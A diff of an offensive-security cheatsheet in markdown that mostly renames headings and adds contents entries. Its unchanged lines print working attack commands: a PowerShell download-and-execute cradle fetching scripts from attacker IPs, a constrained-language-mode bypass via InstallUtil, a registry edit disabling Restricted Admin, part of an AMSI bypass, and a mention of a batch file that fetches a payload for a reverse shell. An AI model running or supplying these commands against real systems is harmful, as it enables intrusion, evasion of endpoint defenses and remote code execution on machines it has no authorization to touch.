@@ -14,9 +14,16 @@ A cheatsheet compiled so you have everything you need in one place. I'd like to 
 - [Shellcode_Runner](#Shellcode_Runner)
 - [Process_injection](#Process_injection)
 
-# [Javascript](#Javascript)
+## [Javascript](#Javascript)
 
 - [Download&Execute](##Download&Execute)
+
+## [Phishing](#Phishing)
+
+## [Powershell](#Powershell)
+
+- [Download_file:](#Download_file:)
+
 
 ***
 # DotNetToJscript
@@ -577,14 +584,14 @@ Then the .bat file will download and execute your .txt file resulting in a revsh
 # Powershell
 <br>
 
-## Download file:
+## Download_file:
 ```
 (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
 ```
 
  <br>
  
-## Powershell Cradle:
+## Powershell_Cradle:
 
 ```
 iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
@@ -592,21 +599,21 @@ iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps
 
 <br>
 
-## Constrained lang mode:
+## Constrained_lang_mode:
 
 ```
 $ExecutionContext.SessionState.LanguageMode
 ```
 <br>
 
-## CLM Bypass:
+## CLM_Bypass:
 
 ```
 Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
 ```
 <br>
 
-## Disable Restricted Admin:
+## Disable_Restricted_Admin:
 
 ```powershell
 Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
@@ -615,7 +622,7 @@ DisableRestrictedAdmin
 <br>
 <br>
 
-## Disable AMSI
+## Disable_AMSI
  <br>
  
  ### Method 1:
@@ -638,7 +645,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 <br>
 <br>
 
-## Load C# assembly reflectively:
+## Load_C#_assembly_reflectively:
 
 ## Download and run assembly without arguments
 ```powershell
@@ -667,7 +674,7 @@ $method.Invoke(0, $null)
 <br>
 <br>
 
-# Active Directory
+# Active_Directory
 
 [Cheatsheet 1](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
 
